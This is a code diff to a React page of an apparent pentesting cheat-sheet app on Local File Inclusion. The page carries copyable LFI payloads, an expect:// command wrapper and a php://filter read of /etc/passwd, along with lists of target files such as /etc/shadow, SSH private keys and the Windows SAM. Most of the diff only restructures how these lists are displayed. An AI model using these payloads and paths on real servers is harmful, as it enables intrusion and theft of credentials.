@@ -25,63 +25,43 @@ export default (props) => {
   const phpWrapperLfi = `/example1.php?page=expect://ls`;
   const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
   const linux = [
-    "/etc/passwd",
-    "/etc/shadow",
-    "/etc/issue",
-    "/etc/group",
-    "/etc/hostname",
-    "/etc/ssh/ssh_config",
-    "/etc/ssh/sshd_config",
-    "/root/.ssh/id_rsa",
-    "/root/.ssh/authorized_keys",
-    "/home/user/.ssh/authorized_keys",
-    "/home/user/.ssh/id_rsa",
+    { title: "/etc/passwd" },
+    { title: "/etc/shadow" },
+    { title: "/etc/issue" },
+    { title: "/etc/group" },
+    { title: "/etc/hostname" },
+    { title: "/etc/ssh/ssh_config" },
+    { title: "/etc/ssh/sshd_config" },
+    { title: "/root/.ssh/id_rsa" },
+    { title: "/root/.ssh/authorized_keys" },
+    { title: "/home/user/.ssh/authorized_keys" },
+    { title: "/home/user/.ssh/id_rsa" },
   ];
-  const items = [
-    {
-      title: "Jean célestin a accepter votre commande",
-      time: "Le 12 Mars 2020 à 19h30",
-      icon: "uil uil-check-circle",
-      check: "uil uil-check",
-      class: "successCard",
-    },
-    {
-      title: "Jean célestin est dans le magasin",
-      time: "Le 12 Mars 2020 à 19h38",
-      icon: "uil uil-shop",
-      check: "uil uil-check",
-      class: "successCard",
-    },
-
-    {
-      title: "Jean célestin vous as envoyé le ticket de caisse",
-      time: "Le 12 Mars 2020 à 19h44",
-      icon: "uil uil-qrcode-scan",
-      check: "uil uil-times",
-      class: "dangerCard",
-    },
-    {
-      title: "Jean célestin est en chemin vers votre domicile",
-      time: "Le 12 Mars 2020 à 19h45",
-      icon: "uil uil-car",
-      check: "uil uil-times",
-      class: "dangerCard",
-    },
+  const apache = [
+    { title: "/etc/apache2/apache2.conf" },
+    { title: "/usr/local/etc/apache2/httpd.conf" },
+    { title: "/etc/httpd/conf/httpd.conf" },
+    { title: "Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log" },
+    { title: "Debian/Ubuntu -> /var/log/apache2/access.log" },
+    { title: "FreeBSD -> /var/log/httpd-access.log" },
+    { title: "/var/log/apache/access.log" },
+    { title: "/var/log/apache/error.log" },
+    { title: "/var/log/apache2/access.log" },
+    { title: "/var/log/apache/error.log" },
   ];
   const mysql = [
-    "/var/lib/mysql/mysql/user.frm",
-    "/var/lib/mysql/mysql/user.MYD",
-    "/var/lib/mysql/mysql/user.MYI",
+    { title: "/var/lib/mysql/mysql/user.frm" },
+    { title: "/var/lib/mysql/mysql/user.MYD" },
+    { title: "/var/lib/mysql/mysql/user.MYI" },
   ];
   const windows = [
-    "/boot.ini",
-    "/autoexec.bat",
-    "/windows/system32/drivers/etc/hosts",
-    "/windows/repair/SAM",
-    "/windows/panther/unattended.xml",
-    "/windows/panther/unattend/unattended.xml",
+    { title: "/boot.ini" },
+    { title: "/autoexec.bat" },
+    { title: "/windows/system32/drivers/etc/hosts" },
+    { title: "/windows/repair/SAM" },
+    { title: "/windows/panther/unattended.xml" },
+    { title: "/windows/panther/unattend/unattended.xml" },
   ];
-
   return (
     <QueueAnim delay={300} duration={1500}>
       <Title
@@ -95,7 +75,7 @@ export default (props) => {
         vulnerability that allows an attacker to include files that exist on the
         target web server.
       </Paragraph>
-      <Paragraph>
+      <Paragraph style={{ marginLeft: 15 }}>
         Typically this is exploited by abusing dynamic file inclusion mechanisms
         that don’t sanitize user input.
       </Paragraph>
@@ -111,7 +91,7 @@ export default (props) => {
             onClick={successInfoReverseShell}
             style={{ marginBottom: 10, marginTop: 15 }}
           >
-            <CopyOutlined /> Copy the reverse shell
+            <CopyOutlined /> Copy the payload
           </Button>
         </Clipboard>
         <Clipboard
@@ -146,7 +126,7 @@ export default (props) => {
             style={{ marginBottom: 10, marginTop: 15 }}
           >
             <CopyOutlined />
-            Copy the reverse shell
+            Copy the payload
           </Button>
         </Clipboard>
         <Clipboard component='a' data-clipboard-text={encodeURI(phpWrapperLfi)}>
@@ -178,7 +158,7 @@ export default (props) => {
             style={{ marginBottom: 10, marginTop: 15 }}
           >
             <CopyOutlined />
-            Copy the reverse shell
+            Copy the payload
           </Button>
         </Clipboard>
         <Clipboard
@@ -203,26 +183,41 @@ export default (props) => {
         }}
       >
         <Title level={3}>Useful LFI files</Title>
-        <Collapse defaultActiveKey={["0"]}>
-          <Panel header='Linux' key='1'>
-            <Paragraph copyable>{linux}</Paragraph>
-          </Panel>
-          <Panel header='Apache' key='2'>
-            {items.map((i, f) => {
-              return (
-                <div key={i}>
-                  <Paragraph copyable>{f.title}</Paragraph>
-                </div>
-              );
-            })}
-          </Panel>
-          <Panel header='MySql' key='3'>
-            <Paragraph copyable>{mysql}</Paragraph>
-          </Panel>
-          <Panel header='Windows' key='4'>
-            <Paragraph copyable>{windows}</Paragraph>
-          </Panel>
-        </Collapse>
+        <Title level={4}>Linux</Title>
+        {linux.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+        <Divider dashed />
+        <Title level={4}>Apache</Title>
+        {apache.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+        <Divider dashed />
+        <Title level={4}>MySQL</Title>
+        {mysql.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+        <Divider dashed />
+        <Title level={4}>Windows</Title>
+        {windows.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
       </div>
       <Divider dashed />
     </QueueAnim>
